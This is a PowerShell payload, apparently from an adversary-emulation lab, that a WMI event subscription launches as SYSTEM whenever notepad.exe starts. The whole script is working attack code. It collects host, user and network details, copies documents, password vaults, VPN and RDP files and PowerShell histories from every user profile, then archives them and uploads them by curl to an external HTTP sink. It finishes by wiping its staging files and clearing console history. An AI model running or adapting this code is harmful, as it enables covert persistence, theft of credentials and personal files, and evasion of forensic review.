# S4-S7 - WMI consumer payload (SYSTEM context, launched by the CommandLineEventConsumer
# when the NotepadFilter fires on notepad.exe). Runs discovery, collection, staging,
# archiving, exfiltration to the internal sink and cleanup. Run-scoped config below is
# injected by install.ps1 at build time.
$RunId    = "RUN-20261003-04"
$SinkBase = "http://192.168.106.1:9180"
$VictimHost = "wmi"
$SinkToken = $env:SINK_TOKEN
if (-not $SinkToken) {
    try { $SinkToken = (Get-Content "$env:TEMP\lab-token.txt" -Raw -ErrorAction Stop).Trim() } catch {}
}
# shared lab credential; the sink rejects uploads without it. The token is NEVER
# committed: it lives in the guest (env or %TEMP%\lab-token.txt) and in the sink's
# own environment.

$wd = "C:\Windows\Temp\wdmp"
$zp = "C:\Windows\Temp\wdmp.zip"
$maxTotalMB = 48
$maxFileSize = 1.5 * 1024 * 1024

if (Test-Path $wd) { Remove-Item $wd -Recurse -Force -ErrorAction SilentlyContinue }
if (Test-Path $zp) { Remove-Item $zp -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $wd -Force | Out-Null

# --- S5 discovery --------------------------------------------------------------
try {
    $os = Get-WmiObject Win32_OperatingSystem
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
           Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
           Select-Object -First 3).IPAddress -join ", "
    $ul = (Get-LocalUser | Select-Object Name, Enabled | Format-Table -Auto | Out-String).Trim()
    $ar = (arp -a) -join "`n"
    $info = @"
HOST: $env:COMPUTERNAME
USER: $env:USERDOMAIN\$env:USERNAME
OS: $($os.Caption) $($os.BuildNumber)
IP: $ip
TIME: $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')

USERS:
$ul

ARP:
$ar
"@
    $info | Out-File "$wd\info.txt" -Encoding UTF8 -Force
} catch {}

# --- S5 collection --------------------------------------------------------------
try {
    $folders = @(
        "C:\Users\*\Desktop", "C:\Users\*\Documents", "C:\Users\*\Downloads",
        "C:\Users\*\Pictures", "C:\Users\*\Music", "C:\Users\*\Videos",
        "C:\Users\*\Favorites", "C:\Users\*\Contacts", "C:\Users\*\Saved Games",
        "C:\Users\*\Searches", "C:\Users\*\Links", "C:\Users\*\OneDrive"
    )
    $allowedExt = '\.(txt|csv|docx|xlsx|pdf|kdbx|ovpn|rdp|log|cfg|ini|conf|ps1|bat|cmd|vbs|js|html|xml|json|sql|db|sqlite|bak|old|swp|tmp|rpt|doc|xls|ppt|pptx|mdb|accdb|lnk|url|msg|eml|one|vsdx|pub|odt|ods|odp|rtf|wps|pages|numbers|key|ppsx|xlsm)$'

    foreach ($folder in $folders) {
        $resolved = Resolve-Path $folder -ErrorAction SilentlyContinue
        foreach ($res in $resolved) {
            Get-ChildItem -Path $res -File -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.Length -le $maxFileSize -and $_.Extension -match $allowedExt } |
                ForEach-Object {
                    $destName = $_.Name
                    $counter = 1
                    while (Test-Path "$wd\$destName") {
                        $base = [System.IO.Path]::GetFileNameWithoutExtension($_.Name)
                        $destName = "$base`_$counter$($_.Extension)"
                        $counter++
                    }
                    Copy-Item $_.FullName "$wd\$destName" -Force -ErrorAction SilentlyContinue
                }
        }
    }
} catch {}

# --- S5 console history ----------------------------------------------------------
try {
    $users = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
    foreach ($user in $users) {
        $hist = "$($user.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $hist) {
            Copy-Item $hist "$wd\ps_history_$($user.Name).txt" -Force -ErrorAction SilentlyContinue
        }
    }
} catch {}

# --- size guard (bounded impact) --------------------------------------------------
$totalSize = (Get-ChildItem $wd -File -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
$totalSizeMB = [math]::Round($totalSize / 1MB, 2)
if ($totalSizeMB -gt $maxTotalMB) {
    $body = @{ run = $RunId; host = $VictimHost; stage = "S5";
               level = "error"; text = "size limit exceeded ($totalSizeMB MB)" } | ConvertTo-Json -Compress
    try { Invoke-RestMethod -Uri "$SinkBase/status/$RunId" -Method Post -ContentType "application/json" -Body $body -ErrorAction SilentlyContinue } catch {}
    Remove-Item $wd -Recurse -Force -ErrorAction SilentlyContinue
    exit 1
}

# --- S5 staging manifest -----------------------------------------------------------
$files = Get-ChildItem $wd -File
"Files: $($files.Count)" | Out-File "$wd\_manifest.txt" -Encoding UTF8
$files | ForEach-Object { "  $($_.Name) [$($_.Length) bytes]" | Out-File "$wd\_manifest.txt" -Encoding UTF8 -Append }

# --- S6 archive ---------------------------------------------------------------------
try {
    Compress-Archive -Path "$wd\*" -DestinationPath $zp -Force -ErrorAction Stop
} catch {
    $body = @{ run = $RunId; host = $VictimHost; stage = "S6"; level = "error";
               text = "compression failed: $_" } | ConvertTo-Json -Compress
    try { Invoke-RestMethod -Uri "$SinkBase/status/$RunId" -Method Post -ContentType "application/json" -Body $body -ErrorAction SilentlyContinue } catch {}
    exit 1
}

# hash the archive before transfer (binary, raw bytes) and record it in the manifest
$zipHash = (Get-FileHash -Path $zp -Algorithm SHA256).Hash
"ZIP_SHA256: $zipHash" | Out-File "$wd\_manifest.txt" -Encoding UTF8 -Append

# --- S6 transfer to the internal sink ------------------------------------------------
# Each upload is checked SEPARATELY: $LASTEXITCODE is captured right after its own
# curl call, and the receipt is fetched back and verified (run, host, file name, size,
# sha256) before the stage is reported as OK. A failed upload or a receipt mismatch
# fails the stage instead of silently proceeding.
$zipInfo = Get-Item $zp
$transferOk = $false
$upErr = $null
if ($zipInfo.Length -gt 0 -and $zipInfo.Length -le 50 * 1024 * 1024) {
    $upUrl = "$SinkBase/artifacts/$RunId/ART-07-01/wdmp.zip"
    $null = curl.exe -s -X PUT -H "X-WMI-Host: $VictimHost" -H "X-LAB-Token: $SinkToken" -T $zp $upUrl 2>&1
    $upCode = $LASTEXITCODE

    $manUrl = "$SinkBase/artifacts/$RunId/ART-06-01/_manifest.txt"
    $null = curl.exe -s -X PUT -H "X-LAB-Token: $SinkToken" --data-binary "@$wd\_manifest.txt" $manUrl 2>&1
    $manCode = $LASTEXITCODE

    if ($upCode -ne 0 -or $manCode -ne 0) {
        $upErr = "upload exit codes zip=$upCode manifest=$manCode"
    } else {
        # fetch the receipt back and verify it against the local zip
        $rcvUrl = "$SinkBase/receipt/$RunId"
        try {
            $receipt = Invoke-RestMethod -Uri $rcvUrl -Method Get -Headers @{ "X-LAB-Token" = $SinkToken } -ErrorAction Stop
            $rf = $receipt.payload.sink_files | Where-Object { $_.name -eq "wdmp.zip" }
            if ($receipt.payload.run_id -eq $RunId -and
                $receipt.payload.host -eq $VictimHost -and
                $rf -and $rf.size -eq $zipInfo.Length -and
                $rf.sha256 -eq $zipHash) {
                $transferOk = $true
            } else {
                $upErr = "receipt mismatch (run/host/size/hash)"
            }
        } catch {
            $upErr = "receipt fetch failed: $_"
        }
    }
} else {
    $upErr = "archive empty or over size guard (no upload attempted)"
}

# status message to the sink (PowerShell channel; status is NOT a transfer claim)
$summary = @{
    run = $RunId; host = $VictimHost; stage = "S6"; level = "info"
    files = $files.Count; zip = $zipInfo.Length; zip_sha256 = $zipHash
    transfer_ok = $transferOk; transfer_error = $upErr
} | ConvertTo-Json -Compress
try { Invoke-RestMethod -Uri "$SinkBase/status/$RunId" -Method Post -ContentType "application/json" -Body $summary -ErrorAction SilentlyContinue } catch {}

# --- S7 cleanup ------------------------------------------------------------------------
Start-Sleep -Seconds 2
try {
    Start-Process cmd -ArgumentList "/c timeout /t 2 >nul & rd /S /Q `"$wd`" & del /F /Q `"$zp`"" -WindowStyle Hidden
    $h = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue }
} catch {}

exit $(if ($transferOk) { 0 } else { 2 })